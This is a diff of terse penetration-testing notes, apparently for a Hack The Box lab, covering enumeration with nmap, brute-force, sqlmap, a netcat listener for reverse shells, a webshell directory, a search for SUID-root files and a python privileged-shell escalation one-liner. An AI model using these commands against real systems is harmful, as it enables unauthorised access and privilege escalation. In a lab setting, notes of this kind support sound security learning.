@@ -1,6 +1,6 @@
 ### Enumeration
-    - Ping
-    - Nmap (nmap -sV [target IP]) (-sV version of the service running)
+    - Ping -c3 (target)
+    - Nmap (nmap -sV -sC [target IP]) (-sV version of the service running, -sC run some scripts)
     - echo "10.129.180.37 s3.thetoppers.htb" | sudo tee -a /etc/hosts
 
     - !!! Brute-force 
@@ -15,6 +15,21 @@ http://{target domain} --append-domain)
     - SQLi
 	- sqlmap 
 
+ip -4 -br a
+watch ip -4 -br a
+ip route
+traceroute [url] 
+mtr
+ethtool
+btop
+guake
+vim /etc/hosts
+micro
+/usr/share/webshells/
+nc -lnvp (port)
+find / -type f -name (flag) 2>/dev/null
+find / -type f -user root -perm -4000 2>/dev/null
+/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 ### Foothold
     - Login Page
         - admin:admin
